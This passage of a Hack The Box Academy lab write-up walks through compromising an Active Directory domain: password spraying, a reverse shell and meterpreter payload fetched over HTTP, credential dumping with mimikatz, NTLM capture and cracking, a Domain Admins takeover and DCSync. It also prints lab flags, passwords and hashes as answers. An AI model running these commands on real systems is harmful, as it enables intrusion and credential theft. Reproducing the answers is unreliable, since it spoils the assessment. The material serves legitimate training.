4. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#4.-use-a-common-method-to-obtain-weak-credentials-for-another-user.-submit-the-username-for-the-user)

Grabbed data to be imported into BlooudHound GUI:

┌─[htb-student@skills-par01]─[~]

└──╼ $sudo bloodhound-python -u 'AB920' -p 'weasal' -ns 172.16.7.3 -d inlanefreight.local -c all

<SNIP>

​

┌─[htb-student@skills-par01]─[~]

└──╼ $zip -r ilfreight_bh.zip *.json

Enumerated shares, didn't find anything interesting:

crackmapexec smb 172.16.7.3 -u AB920 -p weasal --shares

crackmapexec smb 172.16.7.3 -u AB920 -p weasal -M spider_plus --share 'Department Shares'

cat /tmp/cme_spider_plus/172.16.7.3.json

Enumerated list of users and saved them into a file named `users` for password spraying:

┌─[htb-student@skills-par01]─[~]

└──╼ $rpcclient -U AB920 \\\\172.16.7.3

rpcclient $> enumdomusers

<SNIP>

​

OR

​

┌─[htb-student@skills-par01]─[~]

└──╼ $crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users

SMB 172.16.7.3 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

SMB 172.16.7.3 445 DC01 [+] INLANEFREIGHT.LOCAL\AB920:weasal

SMB 172.16.7.3 445 DC01 [+] Enumerated domain user(s)

<SNIP>

┌─[htb-student@skills-par01]─[~]

└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users Welcome1

__ __ __

/ /_____ _____/ /_ _______ __/ /____

/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \

/ ,< / __/ / / /_/ / / / /_/ / /_/ __/

/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/

​

Version: dev (9cfb81e) - 03/07/23 - Ronnie Flathers @ropnop

​

2023/03/07 19:49:15 > Using KDC(s):

2023/03/07 19:49:15 > 172.16.7.3:88

​

2023/03/07 19:49:31 > [+] VALID LOGIN: BR086@inlanefreight.local:Welcome1

2023/03/07 19:49:31 > Done! Tested 2901 logins (1 successes) in 16.427 seconds

​

OR

​

┌─[htb-student@skills-par01]─[~]

└──╼ $crackmapexec smb 172.16.7.3 -u users -p Welcome1 | grep +

SMB 172.16.7.3 445 DC01 [+] INLANEFREIGHT.LOCAL\BR086:Welcome1

**Answer:** `**BR086**`

### 

5. What is this user's password?[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#5.-what-is-this-users-password)

Continued from above

**Answer:** `**Welcome1**`

### 

6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#6.-locate-a-configuration-file-containing-an-mssql-connection-string.-what-is-the-password-for-the-u)

Enumerated shares with new account:

┌─[htb-student@skills-par01]─[~]

└──╼ $crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 --shares

SMB 172.16.7.3 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

SMB 172.16.7.3 445 DC01 [+] INLANEFREIGHT.LOCAL\BR086:Welcome1

SMB 172.16.7.3 445 DC01 [+] Enumerated shares

SMB 172.16.7.3 445 DC01 Share Permissions Remark

SMB 172.16.7.3 445 DC01 ----- ----------- ------

SMB 172.16.7.3 445 DC01 ADMIN$ Remote Admin

SMB 172.16.7.3 445 DC01 C$ Default share

SMB 172.16.7.3 445 DC01 Department Shares READ Share for department users

SMB 172.16.7.3 445 DC01 IPC$ READ Remote IPC

SMB 172.16.7.3 445 DC01 NETLOGON READ Logon server share

SMB 172.16.7.3 445 DC01 SYSVOL READ Logon server share

​

┌─[htb-student@skills-par01]─[~]

└──╼ $crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 -M spider_plus --share 'Department Shares'

[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named 'pylnk3'

SMB 172.16.7.3 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

SMB 172.16.7.3 445 DC01 [+] INLANEFREIGHT.LOCAL\BR086:Welcome1

SPIDER_P... 172.16.7.3 445 DC01 [*] Started spidering plus with option:

SPIDER_P... 172.16.7.3 445 DC01 [*] DIR: ['print$']

SPIDER_P... 172.16.7.3 445 DC01 [*] EXT: ['ico', 'lnk']

SPIDER_P... 172.16.7.3 445 DC01 [*] SIZE: 51200

SPIDER_P... 172.16.7.3 445 DC01 [*] OUTPUT: /tmp/cme_spider_plus

​

┌─[htb-student@skills-par01]─[~]

└──╼ $cat /tmp/cme_spider_plus/172.16.7.3.json

"Department Shares": {

"IT/Private/Development/web.config": {

"atime_epoch": "2022-04-01 11:04:06",

"ctime_epoch": "2022-04-01 11:04:06",

"mtime_epoch": "2022-04-01 11:05:02",

"size": "1.17 KB"

​

┌─[htb-student@skills-par01]─[~]

└──╼ $smbclient -U BR086 \\\\172.16.7.3\\Department\ Shares

Enter WORKGROUP\BR086's password:

Try "help" to get a list of possible commands.

smb: \> get IT\Private\Development\web.config

getting file \IT\Private\Development\web.config of size 1203 as IT\Private\Development\web.config (235.0 KiloBytes/sec) (average 235.0 KiloBytes/sec)

smb: \> exit

​

┌─[htb-student@skills-par01]─[~]

└──╼ $cat IT\\Private\\Development\\web.config

<SNIP>

<connectionStrings>

<SNIP>User ID=netdb;Password=D@ta_bAse_adm1n!"/>

</connectionStrings>

<SNIP>

**Answer:** `**D@ta_bAse_adm1n!**`

### 

7. Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#7.-submit-the-contents-of-the-flag.txt-file-on-the-administrator-desktop-on-the-sql01-host.)

┌─[htb-student@skills-par01]─[~]

└──╼ $impacket-mssqlclient INLANEFREIGHT/netdb@172.16.7.60

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:

[*] Encryption required, switching to TLS

[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master

[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english

[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192

[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.

[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.

[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)

[!] Press help for extra shell commands

​

SQL> xp_cmdshell whoami

nt service\mssql$sqlexpress

​

SQL> xp_cmdshell hostname

SQL01

​

SQL> xp_cmdshell whoami /priv

PRIVILEGES INFORMATION

----------------------

Privilege Name Description State

============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token Disabled

SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled

SeChangeNotifyPrivilege Bypass traverse checking Enabled

SeImpersonatePrivilege Impersonate a client after authentication Enabled

SeCreateGlobalPrivilege Create global objects Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

Caught reverse shell through SQL xp_cmdshell for easier control using PowerShell command from [https://www.revshells.com/](https://www.revshells.com/)​

┌─[htb-student@skills-par01]─[~]

└──╼ $nc -lvnp 11111

listening on [any] 11111 ...

connect to [172.16.7.240] from (UNKNOWN) [172.16.7.60] 50057

PS C:\Windows\system32> hostname; whoami

SQL01

nt service\mssql$sqlexpress

Created meterpreter payload on attack host for easier enumeration and hosted for use, also set up listener to catch meterpreter reverse shell (in another window):

┌─[htb-student@skills-par01]─[~]

└──╼ $msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.16.7.240 LPORT=31337 -f exe -o shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

[-] No arch selected, selecting arch: x64 from the payload

No encoder specified, outputting raw payload

Payload size: 200262 bytes

Final size of exe file: 206848 bytes

Saved as: shell.exe

​

┌─[htb-student@skills-par01]─[~]

└──╼ $python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

​

┌─[htb-student@skills-par01]─[~]

└──╼ $msfconsole -q

msf6 > use multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp

msf6 exploit(multi/handler) > set LHOST ens224

msf6 exploit(multi/handler) > set LPORT 31337

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.7.240:31337

Downloaded and executed payload on target:

PS C:\Users\Public> (New-Object Net.WebClient).DownloadFile('http://172.16.7.240:8000/shell.exe','C:\Users\Public\shell.exe')

PS C:\Users\Public> C:\Users\Public\shell.exe

Multi/handler listener caught meterpreter session:

[*] Meterpreter session 1 opened (172.16.7.240:31337 -> 172.16.7.60:50063 ) at 2023-03-07 20:21:11 -0500

​

meterpreter > hashdump

[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.

meterpreter > getsystem

...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:136b3ddfbb62cb02e53a8f661248f364:::

DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::

meterpreter > shell

Process 5412 created.

Channel 2 created.

Microsoft Windows [Version 10.0.17763.2628]

(c) 2018 Microsoft Corporation. All rights reserved.

​

C:\Windows\system32>whoami

nt authority\system

​

C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt

s3imp3rs0nate_cl@ssic

​

C:\Windows\system32>exit

​

meterpreter > load kiwi

Loading extension kiwi...

.#####. 
mimikatz 2.2.0 20191125 (x64/windows)

.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)

## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )

## \ / ## > http://blog.gentilkiwi.com/mimikatz

'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )

'#####' > http://pingcastle.com / http://mysmartlogon.com ***/

​

Success.

meterpreter > creds_all

[+] Running as SYSTEM

[*] Retrieving all credentials

msv credentials

===============

​

Username Domain NTLM SHA1 DPAPI

-------- ------ ---- ---- -----

SQL01$ INLANEFREIGHT 1d8965fd980425fcf3b9baea8f98699d a81f3b4f6675091d47b1ade3fc4b684cff51183

3

SQL01$ INLANEFREIGHT 6991907663e3f68922d24ac9a573e2c3 33058b24d5882f1dd18ce81988aa64226e2879b

5

mssqlsvc INLANEFREIGHT 8c9555327d95f815987c0d81238c7660 0a8d7e8141b816c8b20b4762da5b4ee7038b515 a1568414db09f65c238b7557bc3ceeb8

c

​

wdigest credentials

===================

​

Username Domain Password

-------- ------ --------

(null) (null) (null)

SQL01$ INLANEFREIGHT (null)

mssqlsvc INLANEFREIGHT (null)

​

kerberos credentials

====================

​

Username Domain Password

-------- ------ --------

(null) (null) (null)

SQL01$ INLANEFREIGHT.LOCAL 31 a3 0f 36 c9 9a 50 72 50 a9 8a 41 08 bb 48 d2 5a 61 f6 46 4f d0 e1 7e 08 33 6e cb ed a2 6f e3 23 c3

3b 63 d0 e3 e1 e7 c2 4c d0 80 c9 7c f2 9a 2a 64 c3 77 f3 3d ca 67 ba 98 f6 cc 06 5e 5b b5 7c aa ef 4

9 8d 26 8a 41 78 bf 39 92 8b 08 e3 31 37 79 8a 3e 87 01 8d c9 bf 48 97 86 77 50 c0 5c a1 4c c7 d4 b3

d7 51 cc c4 9f f3 98 1f 51 7b ed 3f a1 9b 31 b5 13 44 3f 38 f3 53 21 52 9e 56 9e 7f 7d d9 93 15 a4 ea

e9 03 97 48 e0 dd 3b 50 2a 61 be dc 01 1b 78 4f 95 1a 05 70 35 56 0e 52 bc e6 19 94 0a 0c a6 e3 87 f

5 c3 95 50 b8 b5 90 9b e5 00 d5 65 f0 89 2b 6a ff bc e8 99 67 8e 57 af e8 51 71 fa 4a 7b 91 9d 02 ce

b9 74 d2 4f f7 06 79 25 e3 6f 60 11 3b ce e0 0d f7 a0 01 c6 1f 5a 61 3e ea 3a 45 63 09 68 02 3b 72 3f

f2 2a 28 3f

SQL01$ INLANEFREIGHT.LOCAL ;6bu^ur;mJ&ES&#Iu)CQZeckLZsyN >AgIv4DZ^&EX,Wu.ahRkT%c3)R+c&xcu_:]n#V1V.j[=+GTjk?l)z OaU8!c^\#`s?8/E!x

y^itE>kYiBcSgohVb$P

mssqlsvc INLANEFREIGHT.LOCAL Sup3rS3cur3maY5ql$3rverE

sql01$ INLANEFREIGHT.LOCAL 31 a3 0f 36 c9 9a 50 72 50 a9 8a 41 08 bb 48 d2 5a 61 f6 46 4f d0 e1 7e 08 33 6e cb ed a2 6f e3 23 c3

3b 63 d0 e3 e1 e7 c2 4c d0 80 c9 7c f2 9a 2a 64 c3 77 f3 3d ca 67 ba 98 f6 cc 06 5e 5b b5 7c aa ef 4

9 8d 26 8a 41 78 bf 39 92 8b 08 e3 31 37 79 8a 3e 87 01 8d c9 bf 48 97 86 77 50 c0 5c a1 4c c7 d4 b3

d7 51 cc c4 9f f3 98 1f 51 7b ed 3f a1 9b 31 b5 13 44 3f 38 f3 53 21 52 9e 56 9e 7f 7d d9 93 15 a4 ea

e9 03 97 48 e0 dd 3b 50 2a 61 be dc 01 1b 78 4f 95 1a 05 70 35 56 0e 52 bc e6 19 94 0a 0c a6 e3 87 f

5 c3 95 50 b8 b5 90 9b e5 00 d5 65 f0 89 2b 6a ff bc e8 99 67 8e 57 af e8 51 71 fa 4a 7b 91 9d 02 ce

b9 74 d2 4f f7 06 79 25 e3 6f 60 11 3b ce e0 0d f7 a0 01 c6 1f 5a 61 3e ea 3a 45 63 09 68 02 3b 72 3f

f2 2a 28 3f

**Anwer:** `**s3imp3rs0nate_cl@ssic**`

### 

8. Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#8.-submit-the-contents-of-the-flag.txt-file-on-the-administrator-desktop-on-the-ms01-host.)

Found creds `mssqlsvc:Sup3rS3cur3maY5ql$3rverE` above

┌─[htb-student@skills-par01]─[~]

└──╼ $evil-winrm -i 172.16.7.50 -u mssqlsvc -p 'Sup3rS3cur3maY5ql$3rverE'

<SNIP>

*Evil-WinRM* PS C:\Users\mssqlsvc\Documents> cd C:\

*Evil-WinRM* PS C:\> dir

​

Directory: C:\

​

Mode LastWriteTime Length Name

---- ------------- ------ ----

d----- 2/25/2022 10:20 AM PerfLogs

d-r--- 4/11/2022 10:00 PM Program Files

d----- 4/1/2022 10:11 AM Program Files (x86)

d-r--- 3/7/2023 10:01 PM Users

d----- 4/20/2022 5:31 AM Windows

-a---- 4/11/2022 10:19 PM 24 flag.txt

​

*Evil-WinRM* PS C:\> type flag.txt

aud1t_gr0up_m3mbersh1ps!

**Answer:** `**aud1t_gr0up_m3mbersh1ps!**`

### 

9. Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What this user's account name?[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#9.-obtain-credentials-for-a-user-who-has-genericall-rights-over-the-domain-admins-group.-what-this-u)

*Evil-WinRM* PS C:\> upload /home/htb-student/Inveigh.exe C:\Inveigh.exe

Info: Uploading /home/htb-student/Inveigh.exe to C:\Inveigh.exe

Data: 365908 bytes of 365908 bytes copied

Info: Upload successful!

​

*Evil-WinRM* PS C:\> C:\Inveigh.exe

[*] Inveigh 2.0.4 [Started 2023-03-07T23:28:54 | PID 2660]

[+] Packet Sniffer Addresses [IP 172.16.7.50 | IPv6 fe80::6cf1:c554:3df1:aeda%9]

[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]

[+] Spoofer Reply Addresses [IP 172.16.7.50 | IPv6 fe80::6cf1:c554:3df1:aeda%9]

[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]

[ ] DHCPv6

[+] DNS Packet Sniffer [Type A]

[ ] ICMPv6

[+] LLMNR Packet Sniffer [Type A]

[ ] MDNS

[ ] NBNS

[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]

[ ] HTTPS

[+] WebDAV [WebDAVAuth NTLM]

[ ] Proxy

[+] LDAP Listener [Port 389]

[+] SMB Packet Sniffer [Port 445]

[+] File Output [C:\]

[+] Previous Session Files (Not Found)

[*] Press ESC to enter/exit interactive console

[.] [23:29:54] TCP(445) SYN packet from 172.16.7.3:62474

[.] [23:29:54] SMB1(445) negotiation request detected from 172.16.7.3:62474

[.] [23:29:54] SMB2+(445) negotiation request detected from 172.16.7.3:62474

[+] [23:29:54] SMB(445) NTLM challenge [9E814C432674F5C3] sent to 172.16.7.50:62474

[+] [23:29:54] SMB(445) NTLMv2 captured for [INLANEFREIGHT\CT059] from 172.16.7.3(DC01):62474:

CT059::INLANEFREIGHT:<SNIP>

[!] [23:29:54] SMB(445) NTLMv2 for [INLANEFREIGHT\CT059] written to Inveigh-NTLMv2.txt

**Answer:** `**CT059**`

### 

10. Crack this user's password hash and submit the cleartext password as your answer.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#10.-crack-this-users-password-hash-and-submit-the-cleartext-password-as-your-answer.)

┌──(kali㉿kali)-[~]

└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

CT059::INLANEFREIGHT:<SNIP>:charlie1

**Answer:** `**charlie1**`

### 

11. Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#11.-submit-the-contents-of-the-flag.txt-file-on-the-administrator-desktop-on-the-dc01-host.)

BloodHound GUI: found that user `CT059` has `GenericAll` rights over the Domain Admins group (and also the Administrator account) - this can be abused to add us to that group or change the Administrator password. Either method would allow us to perform a DCSync attack against DC.

*Evil-WinRM* PS C:\> upload /home/htb-student/PowerView.ps1 C:\PowerView.ps1

Info: Uploading /home/htb-student/PowerView.ps1 to C:\PowerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

​

*Evil-WinRM* PS C:\> import-module C:\PowerView.ps1

*Evil-WinRM* PS C:\> get-module

​

ModuleType Version Name ExportedCommands

---------- ------- ---- ----------------

Manifest 3.1.0.0 Microsoft.PowerShell.Management {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}

Manifest 3.1.0.0 Microsoft.PowerShell.Utility {Add-Member, Add-Type, Clear-Variable, Compare-Object...}

Script 0.0 PowerView

​

*Evil-WinRM* PS C:\> $SecPassword = ConvertTo-SecureString 'charlie1' -AsPlainText -Force

*Evil-WinRM* PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT.LOCAL\CT059', $SecPassword)

*Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CT059' -Credential $Cred -Verbose

Verbose: [Get-PrincipalContext] Using alternate credentials

Verbose: [Add-DomainGroupMember] Adding member 'CT059' to group 'Domain Admins'

*Evil-WinRM* PS C:\> exit

Perform DCSync to get Active Directory password database:

┌─[htb-student@skills-par01]─[~]

└──╼ $impacket-secretsdump INLANEFREIGHT.LOCAL/CT059@172.16.7.3 -just-dc-user Administrator

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

​

Password:

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)

[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:234a798328eb83fda24119597ffba70b:::

[*] Kerberos keys grabbed

Administrator:aes256-cts-hmac-sha1-96:e75e1db2df92c30dd83d8ac7f98320d6f7526c55949a5d5946ab33ff7547584c

Administrator:aes128-cts-hmac-sha1-96:a824eb2fce306cc5b8cc8c87bf8b3ad3

Administrator:des-cbc-md5:855b08e90e677c20

[*] Cleaning up...

Access DC:

┌─[htb-student@skills-par01]─[~]

└──╼ $evil-winrm -i 172.16.7.3 -u administrator -H 234a798328eb83fda24119597ffba70b

*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname

DC01

​

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami

inlanefreight\administrator

​

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

​

Directory: C:\Users\Administrator\Desktop

​

Mode LastWriteTime Length Name

---- ------------- ------ ----

-a---- 4/20/2022 3:46 AM 17 flag.txt

​

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt

acLs_f0r_th3_w1n!

**Answer:** `**acLs_f0r_th3_w1n!**`

### 

12. Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.[](https://nukercharlie.gitbook.io/htb-academy-cpts/internal-network-and-ad/active-directory-enumeration-and-attacks/labs-skills-assessment#12.-submit-the-ntlm-hash-for-the-krbtgt-account-for-the-target-domain-after-achieving-domain-comprom)

┌─[htb-student@skills-par01]─[~]

└──╼ $impacket-secretsdump INLANEFREIGHT.LOCAL/CT059@172.16.7.3 -just-dc-user krbtgt

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

​

Password:

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)

[*] Using the DRSUAPI method to get NTDS.DIT secrets

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::

[*] Kerberos keys grabbed

krbtgt:aes256-cts-hmac-sha1-96:b043a263ca018cee4abe757dea38e2cee7a42cc56ccb467c0639663202ddba91

krbtgt:aes128-cts-hmac-sha1-96:e1fe1e9e782036060fb7cbac23c87f9d

krbtgt:des-cbc-md5:e0a7fbc176c28a37

[*] Cleaning up...

**Answer:** `**7eba70412d81c1cd030d72a3e8dbe05f**`